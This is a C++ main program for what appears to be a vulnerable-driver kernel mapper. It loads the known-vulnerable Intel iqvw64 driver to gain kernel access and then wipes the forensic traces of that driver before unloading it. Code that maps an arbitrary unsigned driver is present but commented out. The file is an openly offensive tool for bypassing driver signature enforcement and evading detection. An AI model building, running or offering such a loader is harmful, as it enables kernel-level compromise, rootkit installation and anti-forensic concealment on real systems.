#include <utils/fs_utils.hpp>

#include <vuln/drivers/basic_vuln_driver.hpp>
#include <vuln/drivers/iqvw64_driver.hpp>
#include <vuln/vuln_driver_loader.hpp>

#include <kernel/k32_context.hpp>
#include <kernel/k32_parser.hpp>

#include <mapper/driver_mapper.hpp>

#include <vuln/vuln_trace_cleaner.hpp>

#include <filesystem>
#include <print>

int main(int argc, char** argv)
{
    /*if (argc != 2) {
        std::println("Usage: {} <driver_path>", std::filesystem::path(argv[0]).filename().string());
        return EXIT_FAILURE;
    }

    std::filesystem::path driverPath = argv[1];
    if (!std::filesystem::exists(driverPath)) {
        std::println("[-] File not found: {}", driverPath.string());
        return EXIT_FAILURE;
    }

    const auto driverBytes = Utils::FS::ReadBytesFromFile(driverPath);
    if (driverBytes.empty()) {
        std::println("[-] Failed to read driver file");
        return EXIT_FAILURE;
    }*/

    if (!VulnDriverLoader::EnableLoadPrivileges()) {
        std::println("[-] Failed to allow load privileges");
        return EXIT_FAILURE;
    }

    auto iqvw64 = std::make_shared<Iqvw64Driver>("\\\\.\\Nal");

    VulnDriverLoader driverLoader = VulnDriverLoader(iqvw64);
    if (!driverLoader.Load()) {
        std::println("[-] Failed to load vulnerable driver");
        return EXIT_FAILURE;
    }

    auto k32ctx = std::make_shared<K32Context>(iqvw64);

    /*DriverMapper driverMapper = DriverMapper(k32ctx);
    if (!driverMapper.Map((void*)driverBytes.data())) {
        std::println("[-] Failed to mmap driver");
        return EXIT_FAILURE;
    }*/

    auto vulnTraceCleaner = VulnTraceCleaner(k32ctx);
    if (!vulnTraceCleaner.Cleanup()) {
        std::println("[-] Failed to cleanup vulnerable driver traces");
        return EXIT_FAILURE;
    }

    if (!driverLoader.Unload()) {
        std::println("[-] Failed to unload vulnerable driver");
        return EXIT_FAILURE;
    }

    std::println("[+] Success");
    return EXIT_SUCCESS;
}